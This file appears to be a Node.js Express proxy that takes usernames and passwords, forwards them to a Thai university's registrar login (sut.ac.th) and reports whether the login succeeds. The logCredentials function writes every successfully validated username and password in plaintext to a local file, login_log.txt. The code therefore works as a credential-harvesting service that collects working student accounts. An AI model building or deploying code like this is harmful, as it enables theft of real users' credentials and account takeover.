const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 3001;
const qs = require('qs');
const iconv = require('iconv-lite');
var cors = require('cors')
const axios = require('axios');
const cheerio = require('cheerio');
const fs = require('fs'); // นำเข้าโมดูล file system

// ฟังก์ชันสำหรับบันทึกชื่อผู้ใช้และรหัสผ่านลงในไฟล์ข้อความ
function logCredentials(username, password) {
    const logMessage = `Username: ${username}, Password: ${password}\n`; // จัดรูปแบบข้อความที่จะบันทึก
    fs.appendFile('login_log.txt', logMessage, (err) => { // เพิ่มข้อมูลลงในไฟล์ log
        if (err) {
            console.error('เกิดข้อผิดพลาดขณะเขียนไฟล์:', err);
        } else {
            console.log('บันทึกชื่อผู้ใช้และรหัสผ่านเรียบร้อยแล้ว.');
        }
    });
}

// Function to perform an HTTP request
async function curl(method, url, headers, data = null, cookie = null) {
    const options = {
        method: method,
        url: url,
        headers: {
            ...headers,
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
        },
        validateStatus: false,
        maxRedirects: 0,
        responseType: 'arraybuffer'
    };

    if (data) {
        options.data = data;
    }

    if (cookie) {
        options.headers.Cookie = cookie;
    }

    try {
        const response = await axios(options);
        const decodedData = iconv.decode(Buffer.from(response.data), 'windows-874');
        return { data: decodedData, status: response.status, headers: response.headers }; // Return data, status, and headers
    } catch (error) {
        console.error('Error during HTTP request:', error);
        return null;
    }
}

// Function to get the value of BUILDKEY
function getBuildKey(html) {
    const $ = cheerio.load(html);
    const buildKey = $('input[name="BUILDKEY"]').val(); // Use jQuery-like syntax to select the input
    return buildKey || null; // Return the value or null if not found
}

function queryStringToObject(queryString) {
    console.log(iconv.decode(Buffer.from(queryString), 'windows-874'));

    const q = queryString.split('?')[1];
    const pairs = q.split('&');

    var array = pairs.map((el) => {
        const parts = el.split('=');
        return parts;
    });

    return Object.fromEntries(array);
}

function containsLogin(url) {
    if (url.split('?')[0] === "login.asp") {
        return true;
    }
    return false;
}

app.use(bodyParser.urlencoded({ extended: false }));

// parse application/json
app.use(bodyParser.json())
app.use(cors())

const getCookie = async (number) => {
    const resp = await curl("GET", `https://reg${number}.sut.ac.th/registrar/login.asp`);
    return resp.headers['set-cookie'];
}

app.post('/api/v1/validate', async (req, res) => {
    const username = req.body.f_uid;
    const password = req.body.f_pwd;
    const randomNumber = Math.floor(Math.random() * 4) + 2;

    // // บันทึกชื่อผู้ใช้และรหัสผ่านลงในไฟล์ข้อความ
    // logCredentials(username, password);

    const cookie = await getCookie(randomNumber);

    const headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        'Cookie': cookie,
    };

    // call the login endpoint to get the BUILDKEY 
    const resp = await curl("GET", `https://reg${randomNumber}.sut.ac.th/registrar/login.asp`, headers);

    if (resp) {
        const buildKey = getBuildKey(resp.data);
        if (buildKey !== null) {
            // Now make a POST request with the validate endpoint
            const resp2 = await curl("POST", `https://reg${randomNumber}.sut.ac.th/registrar/validate.asp`, {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Cookie': 'CKLANG=0; ' + cookie,
            }, qs.stringify({
                'f_uid': username,
                'f_pwd': password,
                'BUILDKEY': buildKey
            }));

            // Check if there was a redirect
            if (resp2.status >= 300 && resp2.status < 400) {
                const redirectUrl = resp2.headers['location'];
                if (containsLogin(redirectUrl)) {
                    return res.json({ msg: queryStringToObject(redirectUrl).msg });
                }
                   // การเข้าสู่ระบบสำเร็จ (ไม่เจอการ redirect ไปยังหน้า login)
                   logCredentials(username, password); // บันทึกข้อมูลเมื่อ login สำเร็จ
                return res.json({ redirectUrl });
            } else {
                console.log("Login failed.");
                return res.json({ msg: "Login failed." });
            }
        } else {
            console.log("BUILDKEY not found.");
            res.json({ msg: "BUILDKEY not found.", buildKey: null });
        }
    } else {
        console.log("Failed to retrieve the page.");
        return res.json({ msg: "Failed to retrieve the page." });
    }
});

app.listen(port, () => {
    console.log(`Listening at http://localhost:${port}`);
});